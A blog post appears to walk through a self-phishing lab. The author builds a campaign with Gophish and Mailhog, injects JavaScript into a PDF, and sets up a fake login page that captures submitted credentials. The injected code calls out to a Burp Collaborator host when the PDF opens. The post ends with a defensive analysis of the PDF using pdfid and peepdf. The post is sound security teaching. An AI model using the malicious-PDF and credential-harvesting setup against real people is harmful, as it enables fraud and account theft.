I"'b<h3 id="phish-phish-phish">Phish.. Phish.. Phish..</h3>

<!-- excerpt-start -->
<p><span style="font-size:30px;">I</span>n this blog, I am going to phish myself. Jumping directly into a conclusion does not make sense so I will be explaining from “how-to-create” to “how-to-do”.
 <!-- excerpt-end -->
Just the outlines of what I am going to use to perform this task are given below:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Docker
2. Gophish
3. Mailhog
4. Sample pdf file
5. JS2PDFInjector
6. peepdf
7. pdfid
8. Remnux
</code></pre></div></div>

<p>The purpose of using docker is for both learning and easiness.</p>

<p>To spin up both services Gophish and Mailog I have defined them in a docker YAML file</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">services</span><span class="pi">:</span>
  <span class="na">gophish</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">gophish/gophish"</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">3333:3333"</span>
  <span class="na">mailhog</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">mailhog/mailhog"</span>
    <span class="na">ports</span><span class="pi">:</span> 
      <span class="pi">-</span> <span class="s2">"</span><span class="s">1025:1025"</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">8025:8025"</span> 
    <span class="na">depends_on</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s">gophish</span>

</code></pre></div></div>

<h1 id="creating"><strong>Creating</strong></h1>
<h1 id="overview"><strong><em>Overview</em></strong></h1>

<p>First I will inject malicious js code into a pdf file. Then I will phish myself with that attached malicious pdf file. I will also create a fake login page and capture the creds submitted by the victim.</p>

<p> </p>

<p><strong>Step 1: Creating a malicious pdf file</strong></p>

<p>I am using JS2PDFInjector to inject a simple malicious js code into a pdf file.</p>

<p>Link: <a href="https://github.com/cornerpirate/JS2PDFInjector">JS2PDFInjector</a></p>

<p><img src="/assets/img/blog2-phish/1.png" alt=" js2pdfinjector &gt;&lt;" /></p>

<p>This will pop an alert while opening the file on a pdf reader. Not all pdf readers would execute the code. Adobe Acrobat contains the APIs to read js code. For this blog, we will be using acrobat for POC.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">alter alert</span><span class="dl">"</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="nx">submitForm</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/2.png" alt=" js2pdfinjector &gt;&lt;" />
<em>Injecting code into a sample.pdf file</em></p>

<p> </p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="nc">JS2PDFInjector</span><span class="o">-</span><span class="mf">1.0</span><span class="o">.</span><span class="na">jar</span> <span class="err">$</span><span class="o">(</span><span class="n">pwd</span><span class="o">)/</span><span class="n">sample</span><span class="o">.</span><span class="na">pdf</span> <span class="n">app</span><span class="o">.</span><span class="na">js</span>
</code></pre></div></div>

<p>Remember: you need to provide absolute paths for the pdf. Otherwise, you will encounter the error like shown in the image below.</p>

<p><img src="/assets/img/blog2-phish/3.png" alt=" js2pdfinjector2 &gt;&lt;" /></p>

<p> </p>

<p><strong>Step 2: Creating a phishing campaign</strong></p>

<p>Starting from the compose file where we have added two services Gophish and Mailhog.</p>

<blockquote>
  <p>“Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and execute phishing engagements and security awareness training.</p>
</blockquote>

<blockquote>
  <p>“MailHog to create fake SMTP server for testing purpose.</p>
</blockquote>

<p>Spinning up the aforementioned docker file.</p>

<p><img src="/assets/img/blog2-phish/4.png" alt=" dockerup &gt;&lt;" />
The gophish server is exposed to port 3333. The default username is “admin” and the password is “gophish”. However, the default password won’t match as for the docker the password will be different and unique at each start of the service.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -p 3333:3333 gophish/gophish
</code></pre></div></div>

<p>If you are running without a composing tool then I would recommend running in foreground mode. The console will show standard outputs, inputs, and errors in foreground mode. Running with detach mode will conceal all these file handling processes logs.</p>

<p>Scroll and you’ll get the password.</p>

<p><img src="/assets/img/blog2-phish/5.png" alt=" gophish &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/6.png" alt=" gophish &gt;&lt;" /></p>

<p>Change the password.
<img src="/assets/img/blog2-phish/7.png" alt=" gophish &gt;&lt;" /></p>

<p>Now we are logged in.
<img src="/assets/img/blog2-phish/8.png" alt=" gophish &gt;&lt;" /></p>

<p>Why don’t we first test our SMTP server if it is working or not?</p>

<p>As for sending emails, we need an SMTP server. This protocol is widely used to send, receive or relay outgoing emails.</p>

<p><strong>Sending profile</strong> is where we configure our SMTP server. We are using mailhog for testing the SMTP server. It is free and very easy to use.</p>

<p><strong>Mailhog</strong> binds SMTP server to address 0.0.0.:1025.
<img src="/assets/img/blog2-phish/9.png" alt=" mailhog-ip &gt;&lt;" /></p>

<p>It also provides GUI where it stores outgoing emails and shows 
connections.</p>

<p><img src="/assets/img/blog2-phish/10.png" alt=" gophish &gt;&lt;" /></p>

<p> </p>

<h4 id="1-sending-profile"><strong>1. Sending Profile</strong></h4>

<p>Create a new <strong>sending profile</strong>. Put the name. “phish-test@mail.com” is the mail from which I am going to send mail. In the host, we are required to fill it with the SMTP server. I have provided the SMTP binding address exposed by mailhog which is <strong>0.0.0.0:8025</strong>.</p>

<p><img src="/assets/img/blog2-phish/11.png" alt=" sending-profile &gt;&lt;" /></p>

<p>I am sending mail to the test email “hello-testme@mail.com”.</p>

<p><img src="/assets/img/blog2-phish/12.png" alt=" sending-profile &gt;&lt;" /></p>

<p>Clicking on the “send” button.</p>

<p><img src="/assets/img/blog2-phish/13.png" alt=" gophish &gt;&lt;" /></p>

<p>As you see it is throwing an error. It fails to make the connection to the mailhog.</p>

<p>You won’t have to face this issue if you don’t use docker.</p>

<p>I am supposing that the reason for not making a connection is due to running on different containers. To make it successful we have to connect with the IP assigned with it, not with the binding address. Containers can communicate with each other in the same host if they are in a bridge network. It is the default network that gives accessibility to communicate with docker containers with each other.</p>

<p>Notice the network id created for the phishing services.</p>

<p><img src="/assets/img/blog2-phish/14.png" alt=" docker-network-list &gt;&lt;" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker network ls
docker network inspect fcff01c8be6a
</code></pre></div></div>

<p>Let’s find the network IP assigned to it. There is also a gateway for both containers. But to resolve earlier we have to get the IP assigned to container <strong>mailhog</strong>.</p>

<p><img src="/assets/img/blog2-phish/15.png" alt=" gophish &gt;&lt;" /></p>

<p>Scroll until we find the ip assigned to that container.</p>

<p><img src="/assets/img/blog2-phish/16.png" alt=" gophish &gt;&lt;" /></p>

<p>Now let’s try with the above IP.</p>

<p><img src="/assets/img/blog2-phish/17.png" alt=" gophish &gt;&lt;" /></p>

<p>The email is successfully sent.</p>

<p><img src="/assets/img/blog2-phish/18.png" alt=" gophish &gt;&lt;" /></p>

<p>We received it.</p>

<p><img src="/assets/img/blog2-phish/19.png" alt=" gophish &gt;&lt;" /></p>

<p>Now, save the profile.</p>

<p> </p>

<h4 id="2-landing-pages"><strong>2. Landing Pages</strong></h4>

<p>The landing page is the page that is displayed to the victim when he/she clicks the link created by attackers. The page can be anything that can lure victims easily. For example, lottery page, urgent password reset page, etc. If you trick someone then you can get anything from him/her. As an attacker, you should also be very creative while making landing pages. If the page does not look catchy there are fewer chances of victims falling for it.</p>

<p>Just look at the page below, who is going to fall for it? Nobody.</p>

<p>For this blog, I am continuing with it. It’s a simple login page.</p>

<p>I will record the username and password submitted by the target email user.</p>

<p>I will also attach the pdf file which we created earlier.</p>

<p><img src="/assets/img/blog2-phish/20.png" alt=" html-page &gt;&lt;" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Right Now Nothing<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
        name: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="nt">&gt;&lt;br&gt;</span>
        pass: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="nt">&gt;&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
    
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>HTML and PHP files that I am using.</p>

<p>We create a tunnel with the help of ngrok.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ngrok http 9002
</code></pre></div></div>
<p><img src="/assets/img/blog2-phish/21.png" alt=" ngrok &gt;&lt;" /></p>

<p>We also have to start our local server otherwise it will fail to create a tunnel connection.</p>

<p><img src="/assets/img/blog2-phish/22.png" alt=" landing-page &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/23.png" alt=" python-server &gt;&lt;" /></p>

<p>We import the site. Put the forwarding URL created by ngrok.</p>

<p>We could even copy the HTML content instead of importing it. Both have their own purpose.It will just import the static page created by us.</p>

<p><img src="/assets/img/blog2-phish/24.png" alt=" import-site &gt;&lt;" /></p>

<p>Notice the HTML page is rendered.</p>

<p><img src="/assets/img/blog2-phish/25.png" alt=" landing-page-import &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/26.png" alt=" landing-page-redirect &gt;&lt;" /></p>

<p>I have also added a redirection page.</p>

<p><img src="/assets/img/blog2-phish/27.png" alt=" congo &gt;&lt;" /></p>

<p>Save it. You can also modify and delete pages.</p>

<p><img src="/assets/img/blog2-phish/28.png" alt=" landing-page-save &gt;&lt;" /></p>

<h4 id="3-email-templates"><strong>3. Email Templates</strong></h4>

<p><strong>Email Templates</strong> are contents sent to the email targets. You may have noticed the email body in Gmail. Email templates represent that. It is the content of the body that you are going to send to the targeted user.</p>

<p>Poor sample of phishing mail content created by me. XD</p>

<p>You can create your own. If I were a phisher, I would fail miserably.</p>

<p>We are creating an HTML template. This way we could insert HTML tags, elements, etc.</p>

<p><img src="/assets/img/blog2-phish/29.png" alt=" template &gt;&lt;" /></p>

<p><strong>{{.URL}}</strong> this will automatically create the link. It will be our gophish server IP.</p>

<p><strong>{{.FirstName}}</strong> will display the first name of the targeted email user. You will see this in the users and groups section where we have to add users to whom we are going to launch the phishing campaign.</p>

<p><img src="/assets/img/blog2-phish/30.png" alt=" template &gt;&lt;" /></p>

<p>You may have also noticed the “Add Tracking Image”. The purpose of it is to ensure that gophish knows when the user opens the email.</p>

<p>We have created an email template successfully.</p>

<p><img src="/assets/img/blog2-phish/31.png" alt=" template &gt;&lt;" /></p>

<p>I forgot to add an attachment. Let’s edit this. Click on “Add Files” and select the pdf file.</p>

<p><img src="/assets/img/blog2-phish/32.png" alt=" template &gt;&lt;" /></p>

<p> </p>

<h4 id="4-users--groups"><strong>4. Users &amp; Groups</strong></h4>

<p>We add users and basically, we can say victims from a phisher’s perspective. There is also an option to import users in bulk.</p>

<p><img src="/assets/img/blog2-phish/33.png" alt=" template &gt;&lt;" /></p>

<p>We have added a sample user john wick. We can modify groups and delete them.</p>

<p><img src="/assets/img/blog2-phish/34.png" alt=" template &gt;&lt;" /></p>

<p>Save it.</p>

<p> </p>

<h4 id="5-campaigns"><strong>5. Campaigns</strong></h4>

<p>This is the most interesting section. From here we launch our attack, monitoring emails activities like opening of emails, clicking links, etc.</p>

<p>Creating a new campaign where we have an email template, landing page, and groups associated which we created earlier.</p>

<p>Remember the URL should be a gophish listener and should be accessible by targeted users. “172.18.0.2” is the IP from where my gophish server is running.
As I am running docker, it was like before. Just ensure that the URL should be a gophish listener.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>Reflecting the IP into the body will make it very suspicious and it is not a good habit to put the IP address directly into the email body. I have added a hostname in my host’s file. This will resolve my gophish IP address into <strong>“testingserver.op”</strong>.</p>

<p>If you remember we put “{{.URL}}” in our email template. Actually, we are putting a gopher listener URL here.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>Time to launch it.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>The dashboard gives a clear view. The status indicates that the email is sent successfully.</p>

<p>Let’s move into our mailhog GUI. We have one email in our inbox.</p>

<p><img src="/assets/img/blog2-phish/36.png" alt=" template &gt;&lt;" /></p>

<p>We have received one email.</p>

<p><img src="/assets/img/blog2-phish/37.png" alt=" template &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/38.png" alt=" template &gt;&lt;" /></p>

<p>We can find our attached pdf in the MIME section.</p>

<p><img src="/assets/img/blog2-phish/39.png" alt=" template &gt;&lt;" /></p>

<p>Download the attached pdf file.</p>

<p>Notice the link and open it. Yeah, the landing page will be displayed.</p>

<p><img src="/assets/img/blog2-phish/40.png" alt=" template &gt;&lt;" /></p>

<p>Fill up the form and click on submit button.</p>

<p><img src="/assets/img/blog2-phish/41.png" alt=" template &gt;&lt;" /></p>

<p>We will get redirected to the page which is intended to.</p>

<p><img src="/assets/img/blog2-phish/42.png" alt=" template &gt;&lt;" /></p>

<p>Just look at the dashboard. We find:
How many times the link has been clicked
How many times data was submitted
How many times link the email has been opened</p>

<p><img src="/assets/img/blog2-phish/43.png" alt=" template &gt;&lt;" /></p>

<p>Click on the button i.e view results.</p>

<p><img src="/assets/img/blog2-phish/44.png" alt=" template &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/45.png" alt=" template &gt;&lt;" /></p>

<p>Yea, we successfully captured the username and password.</p>

<p>It’s time to open the pdf file which we downloaded earlier
.
It executes the js code which we inserted. See the pop created by the payload.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">alter alert</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/46.png" alt=" template &gt;&lt;" /></p>

<p>Of Course, you can do more than this. I recommend exploring more on this topic.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">submitForm</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>We have to click allow every time and this makes the process very tedious.</p>

<p>( Only for the above payload)</p>

<p><img src="/assets/img/blog2-phish/47.png" alt=" security-warning &gt;&lt;" /></p>

<p>I got the DNS and HTTP requests in my burp collab server.</p>

<p><img src="/assets/img/blog2-phish/48.png" alt=" burp-server &gt;&lt;" /></p>

<p>This was all about how to launch a phishing campaign.</p>

<h3 id="analyzing">Analyzing</h3>

<p>From this point, we are going to analyze all these activities.</p>

<p>The analysis part should always be done in a sandbox environment. Going out of the sandbox environment is prone to death. XD</p>

<p>The first step of yours always should be searching for anything weird in email.</p>

<p> </p>

<p><strong>1.Analyze source</strong></p>

<p> </p>

<p><strong>2.Try to find the origin of email such as sender IP</strong></p>

<p>Sites to look for analyzing email header</p>

<p>Link: <a href="https://toolbox.googleapps.com/apps/messageheader/analyzeheader">Toolbox</a></p>

<p>Link: <a href="https://mha.azurewebsites.net/">mha</a></p>

<p> </p>

<p><strong>3.Extracting Urls and Defanging Urls</strong></p>

<p>Link: <a href="https://gchq.github.io/CyberChef/#recipe=Extract_URLs%28false%29Defang_URL%28true,true,true,%27Valid%20domains%20and%20full%20URLs%27%29&amp;input=aHR0cDovL2dvb2dsZS5jb20">CyberChef</a></p>

<p> </p>

<p><strong>4.Checking DNS records of suspicious URLs or IP addresses</strong></p>

<p> </p>

<p><strong>5.Take a Screenshot of suspicious URLs or IP addresses</strong></p>

<p>Link: <a href="https://www.url2png.com/">URL2PNG</a></p>

<p> </p>

<p><strong>6.Checking if the URLs or IPs are blacklisted or not</strong></p>

<p>Link: <a href="https://www.ipvoid.com/ip-blacklist-check/">IPVOID</a></p>

<p> </p>

<p><strong>7.Checking if the URLs or Ip addresses are malicious or not</strong></p>

<p>Link: <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a></p>

<p> </p>

<p><strong>8.Downloading the attachments, get the hash of it then analyze if they are malicious or not</strong></p>

<p>Link: <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a></p>

<p>Link: <a href="https://talosintelligence.com/talos_file_reputation">talosintelligence</a></p>

<p> </p>

<p><strong>9.Finally we go deeper, we use different malware analysis tools. Both automatic and manual approaches should be followed.</strong></p>

<p> </p>

<p>Of course, there are more than this, but according to our context for this blog, we are going to analyze the attached pdf.</p>

<p>I am going to use remnux distro to analyze the pdf file.</p>

<blockquote>
  <p>” <strong>REMnux®</strong> is a Linux toolkit for reverse-engineering and analyzing malicious software. REMnux provides a curated collection of free tools created by the community. Analysts can use it to investigate malware without having to find, install, and configure the tools.</p>
</blockquote>

<p>I have already pulled the image.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull remnux/remnux-distro
docker run <span class="nt">--rm</span> <span class="nt">-itd</span> remnux/remnux-distro /bin/bash
docker <span class="nb">cp </span>downloadme.pdf <span class="s1">'&lt;contid&gt;:/tmp'</span>
docker <span class="nb">exec</span> <span class="nt">-it</span> d3511ccab833 /bin/bash
</code></pre></div></div>

<p>We are now into the container.</p>

<p><img src="/assets/img/blog2-phish/49.png" alt=" burp-server &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/50.png" alt=" burp-server &gt;&lt;" /></p>

<p>First, check if the pdf has the correct magic number or not.</p>

<p><img src="/assets/img/blog2-phish/51.png" alt=" pdf-magic-num &gt;&lt;" /></p>

<p>To check it, visit here: <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Signatures</a></p>

<p>It seems correct.</p>

<p>Let’s analyze the pdf file with a tool called <strong>pdfid</strong>.</p>

<p><img src="/assets/img/blog2-phish/52.png" alt=" pdfid &gt;&lt;" /></p>

<p>It contains some javascript. It is better for us not to open the pdf file as /OpenAction is also 1 which means the js will take some actions on opening the pdf file.</p>

<p>What other headers can you find below?</p>

<p>The first 7 words or less to it , you can find them in almost every pdf.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Page - the number of pages in pdf

/Encrypt - stipulates a password need to be read

/ObjStm - object streams

/Js - pdf file may contains js code which could be malicious to open

/AA  and /OpenAction - action that will carried out automatically when we open a pdf file. Could automatically launch malicious js commands

/AcroForm - pdf form authored with Adobe Acrobat Pro/Standard

/JBIG2Decode - indicates pdf uses JBIG2Decode compression

/RichMedia - use to embed files,videos etc on pdf

/Launch - to lauch some actions

/EmbeddedFile -   contains some external files

/XFA - XML Forms Architecture

/URI -  Url to access

</code></pre></div></div>

<p>I find <strong>peedpdf</strong> more cooler than <strong>pdfid</strong> as <strong>peepdf</strong> can provide the same information. It has been found that the pdf contains some suspicious elements i.e JS</p>

<p><img src="/assets/img/blog2-phish/53.png" alt=" peepdf &gt;&lt;" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdfid lastone.pdf
peepdf lastone.pdf
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/54.png" alt=" peepdf &gt;&lt;" /></p>

<p>We can extract the js contents using these tools. For this, we have to write a simple script. i.e extract js &gt; aything.txt
save it in a file.</p>

<p>echo ‘extract js &gt; extracted.txt’ &gt; anything.txt</p>

<p>now extracting the js content.</p>

<p>peepdf -s extract.txt malicouspdf.pdf</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'extract js &gt; extracted.txt'</span> <span class="o">&gt;</span> anything.txt
peepdf <span class="nt">-s</span> extract.txt malicouspdf.pdf

</code></pre></div></div>
<p><img src="/assets/img/blog2-phish/55.png" alt=" peepdf-extract &gt;&lt;" /></p>

<p>The js content is successfully extracted.</p>

<p>Thank you for reading. :)</p>

<p>Have a good day/night.</p>
:ET